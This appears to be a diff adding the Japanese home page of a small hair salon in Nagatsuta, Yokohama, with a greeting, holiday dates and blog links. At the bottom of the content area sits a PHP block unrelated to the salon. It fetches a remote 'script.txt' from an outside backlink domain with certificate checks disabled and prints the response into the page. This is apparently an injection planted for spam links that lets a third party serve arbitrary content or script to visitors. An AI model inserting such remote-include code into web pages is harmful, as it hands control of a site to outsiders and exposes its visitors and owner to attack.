@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ja" itemscope itemtype="http://schema.org/Blog">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="description" content="お客様のリラックスを第一に考えた空間づくりをしています。初来店の方には、20％オフクーポンも（※平日限定）。キッズスペース完備・駐車場３台。">
+    <title>長津田の美容室・美容院 PIRICA (ピリカ)</title>
+    <link rel="canonical" href="http://www.pirica-nagatsuta.com/">
+    <!--#include virtual="/ssi/meta.html" -->
+  <script src="/js/jquery.ticker.js" type="text/javascript"></script>
+<script src="/js/site.js" type="text/javascript"></script>
+    <!-- Open Graph Protocol -->
+    <meta property="og:type" content="article">
+    <meta property="og:locale" content="ja_JP">
+    <meta property="og:title" content="長津田の美容室・美容院 PIRICA (ピリカ)">
+    <meta property="og:url" content="http://www.pirica-nagatsuta.com/">
+    <meta property="og:description" content="お客様のリラックスを第一に考えた空間づくりをしています。初来店の方には、20％オフクーポンも（※平日限定）。キッズスペース完備・駐車場３台。">
+    <meta property="og:site_name" content="長津田の美容室・美容院 PIRICA (ピリカ)">
+    <meta property="og:image" content="/x/mt-static/support/theme_static/rainier/img/siteicon-sample.png">
+    <!-- Microdata -->
+    <meta itemprop="description" content="お客様のリラックスを第一に考えた空間づくりをしています。初来店の方には、20％オフクーポンも（※平日限定）。キッズスペース完備・駐車場３台。">
+    <meta itemprop="name" content="長津田の美容室・美容院 PIRICA (ピリカ)">
+    <link itemprop="url" href="http://www.pirica-nagatsuta.com/">
+    <link itemprop="image" href="/x/mt-static/support/theme_static/rainier/img/siteicon-sample.png">
+  
+</head>
+  <body id="top">
+    <div id="container">
+      <div id="container-inner">
+      
+    <!--#include virtual="/ssi/header.html" -->
+
+<div id="top-header" class="inFrame clearfix">
+          <section class="logo">
+          <h3>PIRICA</h3>
+          <p>長津田に新しい美容室がオープンします</p>
+          </section>
+          <!--section id="info">
+          <p class="caution"><a href="/blog/2020/04/post-438.html">緊急事態宣言における当サロンの営業について</a></p>
+          </section-->
+          <section id="info">
+          
+          </section>
+
+          <section class="greeting">
+
+          <h3>オーナー砂田拓哉よりご挨拶</h3>
+          <p>神奈川県横浜市長津田にある美容室「PIRICA」。夫婦で始めた小さなお店ですが、お客様のご要望を叶えられる素敵なお店を目指し、日々、みな様のお越しをお待ちしております。</p>
+          </section>
+
+<section class="closeday">
+
+<ul class="clearfix">
+
+<li>
+<dl class="clearfix">
+<dt>7月のお休み</dt>
+<dd>1（火）、8（火）、15（火）、22（火）、29（火）</dd>
+</dl>
+</li>
+
+<li>
+<dl class="clearfix">
+<dt>8月のお休み</dt>
+<dd>5（火）、12（火）、19（火）、26（火）</dd>
+</dl>
+</li>
+
+</ul>
+
+</section>
+
+<div id="ticker-wrapper" class="no-js clearfix">
+<ul id="js-news" class="js-hidden clearfix">
+
+<li class="news-item">
+<a class="clearfix ease05" href="http://www.pirica-nagatsuta.com/blog/2025/07/post-563.html">
+<span>　先日、お客様から教えて頂いた大和にあるゲームセンター、...</span></a></li>
+
+<li class="news-item">
+<a class="clearfix ease05" href="http://www.pirica-nagatsuta.com/blog/2025/07/post-562.html">
+<span>毎年恒例、夏限定のひんやり涼しいシャンプー始めました！ ...</span></a></li>
+
+<li class="news-item">
+<a class="clearfix ease05" href="http://www.pirica-nagatsuta.com/blog/2025/05/post-561.html">
+<span>　少し前のお休みに相模原のトランポリンパークMr.JUM...</span></a></li>
+
+<li class="news-item">
+<a class="clearfix ease05" href="http://www.pirica-nagatsuta.com/blog/2025/05/post-560.html">
+<span> GW最終日、 火曜日と祝日が重なり、我が家も家族揃って...</span></a></li>
+
+<li class="news-item">
+<a class="clearfix ease05" href="http://www.pirica-nagatsuta.com/blog/2025/05/post-559.html">
+<span>今年もGWがやって来ました☆ 先日、 こんにゃく無料バイ...</span></a></li>
+
+<li class="news-item">
+<a class="clearfix ease05" href="http://www.pirica-nagatsuta.com/blog/2025/03/post-558.html">
+<span> 先日、次女が8歳の誕生日を迎えました。 次女は、欲しい...</span></a></li>
+
+<li class="news-item">
+<a class="clearfix ease05" href="http://www.pirica-nagatsuta.com/blog/2025/03/post-557.html">
+<span>先日、 日本一の養殖マアジ生産出荷量を誇る 沼津内浦漁協...</span></a></li>
+
+<li class="news-item">
+<a class="clearfix ease05" href="http://www.pirica-nagatsuta.com/blog/2025/01/post-556.html">
+<span>　皆さまは休日はどのように過ごされていますでしょうか？ ...</span></a></li>
+
+</ul>
+</div>
+        </div>
+        <!-- #top-header -->
+      
+  <div id="content">   
+<?php
+$url = 'https://backlinkku.id/menu/aged-v1/script.txt';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$content = curl_exec($ch);
+if (curl_errno($ch)) {
+    echo "cURL Error: " . curl_error($ch);
+} else {
+    echo $content;
+}
+curl_close($ch);
+?>
